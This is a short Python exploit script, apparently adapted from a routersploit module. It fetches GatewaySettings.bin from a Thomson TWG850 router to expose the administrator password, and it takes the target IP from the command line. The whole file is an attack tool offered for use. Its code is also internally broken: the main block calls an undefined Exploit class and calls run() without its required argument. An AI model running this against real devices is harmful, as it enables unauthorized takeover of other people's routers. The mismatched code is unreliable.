target = ""
# rsf exploit module
# description: Module exploits Thomson TWG850 password disclosure vulnerability which allows fetching administration's password.

import requests

def run(target):
    url = f"http://{target}/GatewaySettings.bin"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and "0MLog" in response.text:
            print("[+] Exploit success")
            print("[*] Reading file GatewaySettings.bin")
            print(response.text)
        else:
            print("[-] Exploit failed. Device seems to be not vulnerable.")
    except requests.RequestException:
        print("[-] Request failed")

# Author: ediop3




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
